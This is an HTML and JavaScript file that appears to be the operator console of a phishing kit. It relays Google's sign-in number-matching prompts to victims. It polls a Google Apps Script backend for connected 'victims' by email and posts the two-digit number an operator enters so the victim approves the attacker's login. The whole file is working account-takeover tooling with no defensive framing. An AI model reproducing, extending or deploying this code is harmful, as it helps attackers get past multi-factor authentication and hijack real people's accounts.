<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Prompt Control - Set Number</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 30px; }
    h1 { color: #ff6b6b; }
    .victim-card { background: #161b22; padding: 20px; border-radius: 8px; margin: 16px 0; border: 1px solid #30363d; }
    input { padding: 10px; font-size: 20px; width: 80px; text-align: center; background: #0d1117; color: white; border: 1px solid #444; border-radius: 4px; }
    button { padding: 10px 20px; background: #238636; color: white; border: none; border-radius: 6px; cursor: pointer; }
    button:hover { background: #2ea043; }
    .current-number { font-size: 48px; color: #58a6ff; font-weight: bold; margin: 12px 0; }
  </style>
</head>
<body>
  <h1>Prompt Relay Control</h1>
  <p>Enter the number Google shows you on your device.</p>

  <div id="victims-container"></div>

  <script>
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxQJGkwB1ih5K5wEAjXGvcROhga4th0CPzhu2rMRyFg1UgYyWjcDUgyfdDxUpVwaLx0/exec
      ";

    function refresh() {
      fetch(`${SCRIPT_URL}?getVictims=true`)
        .then(r => r.json())
        .then(victims => {
          console.log("Dashboard received victims:", victims);
          document.getElementById("victims-container").innerHTML = victims.length === 0
            ? "<p>No victims connected yet.</p>"
            : victims.map(v => `
              <div class="victim-card">
                <strong>${v.email}</strong><br>
                <small>${new Date(v.timestamp).toLocaleString()}</small>
                <div class="current-number">Number: ${v.prompt_number || "â€”"}</div>
                <input type="text" id="n-${v.email}" maxlength="2" placeholder="47">
                <button onclick="set('${v.email}')">Set</button>
              </div>
            `).join('');
        })
        .catch(err => console.error("Dashboard fetch failed:", err));
    }

    function set(email) {
      const val = document.getElementById(`n-${email}`).value.trim();
      if (!/^\d{2}$/.test(val)) return alert("Enter 2 digits (10-99)");

      console.log("Setting number for", email, "to", val);

      fetch(SCRIPT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({ action: "set_number", email, prompt_number: val })
      })
      .then(r => r.json())
      .then(d => {
        console.log("Set number response:", d);
        if (d.success) alert("Number sent!");
        else alert("Failed: " + (d.error || "Unknown"));
        refresh();
      })
      .catch(err => console.error("Set number failed:", err));
    }

    setInterval(refresh, 5000);
    refresh();
  </script>
</body>
</html>
